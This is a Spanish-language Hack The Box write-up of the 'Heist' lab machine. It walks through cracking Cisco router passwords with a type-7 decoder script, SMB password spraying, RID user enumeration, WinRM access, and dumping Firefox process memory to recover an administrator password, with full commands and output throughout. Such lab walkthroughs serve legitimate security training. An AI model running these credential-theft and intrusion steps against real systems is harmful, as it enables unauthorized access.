@@ -1,0 +1,231 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB-Heist — themaxterone</title>
+<meta name="description" content="WriteUp de la máquina HTB Heist – Type: Easy">
+<meta property="og:title" content="HTB-Heist — themaxterone">
+<meta property="og:description" content="WriteUp de la máquina HTB Heist – Type: Easy">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary">
+<meta name="theme-color" content="#07090c">
+<link rel="icon" href="../assets/images/maxteravatar.png">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/site.css">
+
+</head>
+<body class="post-page">
+<div class="progress" aria-hidden="true"><div id="progress-bar"></div></div>
+<header class="site-header">
+  <div class="wrap nav">
+    <a class="brand" href="../" aria-label="themaxterone home"><img src="../assets/images/maxteravatar.png" alt="" width="32" height="32"><span><b>~/</b>themaxterone</span></a>
+    <button class="nav-toggle" type="button" aria-label="Toggle menu" aria-expanded="false"><span></span><span></span></button>
+    <nav class="nav-links" id="nav-links">
+      <a href="../">home</a>
+      <a href="../writeups/" class="active">write-ups</a>
+      <a href="../writeups/?cat=Scripts">tools</a>
+      <a href="../about/">about</a>
+      <a class="nav-cta" href="https://github.com/themaxterone" target="_blank" rel="noopener noreferrer">github ↗</a>
+    </nav>
+  </div>
+</header>
+<main>
+<header class="post-head">
+  <div class="wrap narrow">
+    <nav class="crumbs" aria-label="Breadcrumb"><a href="../">home</a> / <a href="../writeups/">write-ups</a> / <span>HTB-Heist</span></nav>
+    <p class="eyebrow"><span class="dot"></span> machine write-up</p>
+    <h1>HTB-Heist <img class="title-icon" src="../assets/images/hackthebox.webp" alt="" width="36" height="36"></h1>
+    <div class="card-meta"><time datetime="2022-04-06">Apr 06, 2022</time><span>·</span><span>4 min read</span></div>
+    <div class="chips"><a class="chip" href="../writeups/?tag=HTB">HTB</a><a class="chip" href="../writeups/?tag=Easy">Easy</a></div>
+  </div>
+</header>
+<div class="wrap post-layout">
+  <aside class="toc" aria-label="Table of contents"><p class="toc-title">// contents</p><ol><li><a href="#reconocimiento">Reconocimiento</a></li><li><a href="#explotación">Explotación</a></li></ol></aside>
+  <article class="prose" lang="es">
+<p><img src="../assets/images/writeups/heist/heist.png" alt="" loading="lazy"></p>
+<p><a href="https://app.hackthebox.com/machines/Heist" target="_blank" rel="noopener noreferrer">Maquina</a> </p>
+<h2 id="reconocimiento"><a class="anchor" href="#reconocimiento" aria-hidden="true">#</a>Reconocimiento</h2>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code><span class="hljs-built_in">sudo</span> nmap -sCV --min-rate 5000 -Pn 10.10.10.149</code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.149
+Host is up (0.042s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not <span class="hljs-built_in">set</span>
+| http-title: Support Login Page
+|_Requested resource was login.php
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp open  msrpc         Microsoft Windows RPC
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="hljs-built_in">date</span>: 2022-04-06T13:56:12
+|_  start_date: N/A
+|_clock-skew: 5m43s</code></pre></div>
+<p>En la web podemos ver un panel de login y podemos entrar como <strong>guest</strong></p>
+<p><img src="../assets/images/writeups/heist/panel1.png" alt="" loading="lazy"></p>
+<p>Una vez dentro, veriamos que se trata de una especie de panel de ticketing donde hay diferentes usuarios que guardamos los nombres y tiene un fichero adjuntado a un mensaje donde se encuentran contraseñas que podemos crackear.</p>
+<p><img src="../assets/images/writeups/heist/panel2.png" alt="" loading="lazy"></p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">output</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>!
+security passwords min-length 12
+enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+!
+username rout3r password 7 0242114B0E143F015F5D1E161713
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
+!</code></pre></div>
+<h2 id="explotación"><a class="anchor" href="#explotación" aria-hidden="true">#</a>Explotación</h2>
+<p>Con <strong>john</strong> podemos crackear el md5:</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>john  --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long pass.txt
+
+└─$ john --show pass.txt
+?:stealth1agent</code></pre></div>
+<p>Y con el siguiente script en python que se puede encontrar por internet se pueden descifrar las otras dos passwords:</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">python</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> unhexlify
+
+<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Usage: <span class="hljs-subst">{sys.argv[<span class="hljs-number">0</span>]}</span> [level 7 hash]&quot;</span>)
+    exit()
+
+static_key = <span class="hljs-string">&quot;tfd;kfoA,.iyewrkldJKD&quot;</span>
+enc = sys.argv[<span class="hljs-number">1</span>]
+start = <span class="hljs-built_in">int</span>(enc[:<span class="hljs-number">2</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>
+enc = unhexlify(enc[<span class="hljs-number">2</span>:])
+key = static_key[start:] + static_key[:start]
+
+plain = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(x ^ <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)]))  <span class="hljs-keyword">for</span> i, x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(enc)])
+<span class="hljs-built_in">print</span>(plain)</code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>┌──(maxter㉿kali)-[~/work]
+└─$ python python.py 0242114B0E143F015F5D1E161713      
+<span class="hljs-variable">$uperP</span>@ssword
+                                                                                                                                                                                                                                            
+┌──(maxter㉿kali)-[~/work]
+└─$ python python.py 02375012182C1A1D751618034F36415408
+Q4)sJu\Y8qz*A3?d</code></pre></div>
+<p>Usamos <strong>crackmapexec</strong> para comprobar si existe algun usuario con alguna contraseña para logearse en la máquina.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>crackmapexec smb 10.10.10.149 -u usr.txt -p pass.txt</code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">output</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent</code></pre></div>
+<p>Podemos enumerar mas usuarios en la máquina en el caso de que los necesitaramos.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>rpcclient -U <span class="hljs-string">&#x27;hazard%stealth1agent&#x27;</span> 10.10.10.149</code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">output</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>rpcclient $&gt; lookupnames hazard
+hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
+rpcclient $&gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008 
+S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)</code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1000..1050}; <span class="hljs-keyword">do</span> rpcclient -U <span class="hljs-string">&#x27;hazard%stealth1agent&#x27;</span> 10.10.10.149 -c <span class="hljs-string">&quot;lookupsids S-1-5-21-4254423774-1266059056-3197185112-<span class="hljs-variable">$i</span>&quot;</span> | grep -v unknown; <span class="hljs-keyword">done</span></code></pre></div>
+<p>Añadimos los siguientes usuarios a la nuestra lista.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">output</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)
+S-1-5-21-4254423774-1266059056-3197185112-1009 SUPPORTDESK\support (1)
+S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK\Chase (1)
+S-1-5-21-4254423774-1266059056-3197185112-1013 SUPPORTDESK\Jason (1)</code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>crackmapexec smb 10.10.10.149 -u chase -p pass.txt</code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">output</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\chase:Q4)sJu\Y8qz*A3?d </code></pre></div>
+<p>Nos conectamos con <strong>evil-winrm</strong></p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>└─$ evil-winrm -i 10.10.10.149 -u chase -p <span class="hljs-string">&#x27;Q4)sJu\Y8qz*A3?d&#x27;</span>    </code></pre></div>
+<p>Al movernos por la máquina no encontramos nada y podriamos mirar los procesos con el comando <strong>PS</strong> y nos encontramos algunos de <strong>firefox</strong> y podríamos intentar sacar algunas <strong>credenciales</strong> que tenga en el navegador.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">output</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>   1478      57    23496      79184              4316   1 explorer
+    347      19    10240      38684       0.05   1736   1 firefox
+    405      33    26756      84500       0.80   2584   1 firefox
+   1048      63   112260     188264       3.83   3672   1 firefox
+    385      28    21712      58504       0.97   6288   1 firefox
+    355      25    16432      39132       0.09   6652   1 firefox
+     49       6     1504       3852               756   0 fontdrvhost
+     49       6     1792       4648               764   1 fontdrvhost</code></pre></div>
+<p>Nos dumpeamos las credenciales con el <a href="https://download.sysinternals.com/files/Procdump.zip" target="_blank" rel="noopener noreferrer">Procdump</a> y lo subimos con el comando upload de <strong>evil-winrm</strong>.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>*Evil-WinRM* PS C:\Users\Chase\Documents&gt; .\procdump64.exe -accepteula -ma 1736
+
+ProcDump v10.11 - Sysinternals process dump utility
+Copyright (C) 2009-2021 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+[13:34:14] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_220419_133414.dmp
+[13:34:14] Dump 1 writing: Estimated dump file size is 288 MB.
+[13:34:16] Dump 1 complete: 288 MB written <span class="hljs-keyword">in</span> 1.5 seconds
+[13:34:16] Dump count reached.
+
+*Evil-WinRM* PS C:\Users\Chase\Documents&gt; </code></pre></div>
+<p>Con el programa <a href="https://download.sysinternals.com/files/Strings.zip" target="_blank" rel="noopener noreferrer">Strings</a> podemos aclarar el fichero dmp a un txt algo mas visible para nosotros.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>*Evil-WinRM* PS C:\Users\Chase\Documents&gt; cmd /c <span class="hljs-string">&quot;strings.exe -accepteula 
+firefox.exe_220419_133414.dmp &gt; fichero.txt&quot;</span></code></pre></div>
+<p>Buscamos la posible contraseña en el <strong>fichero.txt</strong></p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">output</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>*Evil-WinRM* PS C:\Users\Chase\Documents&gt; findstr &quot;login_password&quot; fichero.txt
+MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
+MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
+MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
+RG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
+MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
+*Evil-WinRM* PS C:\Users\Chase\Documents&gt; </code></pre></div>
+<p>Comprobamos que usuario somos al entrar con <strong>evil-winrm</strong></p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>└─$ evil-winrm -i 10.10.10.149 -u Administrator -p <span class="hljs-string">&#x27;4dD!5}x/re8]FBuZ&#x27;</span>    </code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">output</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+supportdesk\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::d8
+   IPv6 Address. . . . . . . . . . . : dead:beef::dcaf:64d7:3f43:1c72
+   Link-local IPv6 Address . . . . . : fe80::dcaf:64d7:3f43:1c72%15
+   IPv4 Address. . . . . . . . . . . : 10.10.10.149
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:551%15
+                                       10.10.10.2
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </code></pre></div>
+<p>Flag <strong>Chase</strong>:</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">powershell</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\Chase\Desktop&gt; <span class="hljs-built_in">dir</span>
+
+    Directory: C:\Users\Chase\Desktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span>
+<span class="hljs-literal">-a----</span>        <span class="hljs-number">4</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2019</span>   <span class="hljs-number">9</span>:<span class="hljs-number">08</span> AM            <span class="hljs-number">121</span> todo.txt
+<span class="hljs-literal">-ar---</span>        <span class="hljs-number">4</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span>:<span class="hljs-number">21</span> PM             <span class="hljs-number">34</span> user.txt
+
+*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\Chase\Desktop&gt;</code></pre></div>
+<p>Flag <strong>Administrator</strong></p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">powershell</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">dir</span>
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span>
+<span class="hljs-literal">-ar---</span>        <span class="hljs-number">4</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span>:<span class="hljs-number">21</span> PM             <span class="hljs-number">34</span> root.txt
+
+*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\Administrator\Desktop&gt;</code></pre></div>
+
+
+  </article>
+</div>
+<nav class="wrap narrow pager" aria-label="More posts">
+  <a href="../HTB-Jerry/"><span>← older</span>HTB-Jerry</a>
+  <a class="right" href="../ScriptUsrGrp/"><span>newer →</span>Script-UsrGrp</a>
+</nav>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <p><span class="prompt">$</span> echo "stay curious, stay legal"</p>
+    <p class="muted">© 2026 themaxterone · Hack The Box write-ups &amp; tools</p>
+    <p><a href="https://github.com/themaxterone" target="_blank" rel="noopener noreferrer">github.com/themaxterone</a></p>
+  </div>
+</footer>
+<script src="../assets/js/site.js" defer></script>
+</body>
+</html>
